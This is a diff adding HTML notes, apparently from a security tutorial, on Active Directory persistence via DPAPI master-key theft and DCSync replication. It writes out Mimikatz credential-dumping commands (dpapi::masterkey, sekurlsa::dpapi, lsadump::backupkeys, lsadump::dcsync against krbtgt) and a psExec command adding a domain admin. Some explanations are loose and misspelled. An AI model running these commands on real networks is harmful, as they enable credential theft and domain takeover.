@@ -26,3 +26,24 @@ Methods:
   <ul>psExec \\<DC name> -accepteula net localgroup "Admins" TheUserName /add</ul>
   <ul>After succesfully adding a new user to the "Admins" group, the attacker uses these credentials to hold persistence on the target DC</ul>
 </ol></p>
+
+<h2>Data Protection API abuse (DPAPI)</h2>
+<p>DPAPI is unified location in Windows environments where all the cryptographically secured files, passwords of browsers and other critical data are stored. Windows DC contain a master key to decript DPAPI - protected files. 
+  Attackers often attempt to obtain this master key using any of the following methods: 
+<ol>
+  <ul>Run MIMIKATZ command to recover the master key using the password of a compromised user</ul>
+  <ul>dpapi::masterkey /in:"c:\users\ThisSystem\AppData\Roaming\Microsoft\Protect\S-1-5-21-255274371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /sid:S-1-5-21-255274371-813931464-1050690807-1106 /password:******** /protected</ul>
+  <ul>Run the following command to retrieve all local master keys with compromised admin credentials: sekurlsa::dpapi</ul>
+  <ul>Run the following command to retrieve all backup master keys: lsadump::backupkeys /system:dc01.offense.local /export</ul>
+  <ul>Cross-check whether the secured master keys are obtained by navigating through the root location containing the MIMIKATZ.exe file and check for file formats such as .der, .key, .pvk and .pfx</ul>
+  <ul>By obtaining a master key, the attacker can open any DPAPI-encrypted file from any device associated with the network and maintain persistence.</ul>
+</ol></p>
+
+<h2>Malicious Replication</h2>
+<p>Malicious Replication enables attackers to create an exact copy of user data using the admin credentials. This technique allows attackers to compromise other credentials and access accounts from a remote location.
+<ol>
+  <ul>Attackers follow all the DCSync attack steps to replicate sensitive accounts such as "krbgt" which serves as a master key for signing Kerberos tickets</ul>
+  <ul>Attackers attempt malicious replication using the following command:</ul>
+  <ul>Invoke-Mimikatz -command "lsadump::dcsync /domain:<Target Domain> /user:<krbtgt>\<Any Domain User>"</ul>
+  <ul>The above command generates NTML hashes of the given domain user</ul>
+</ol></p>
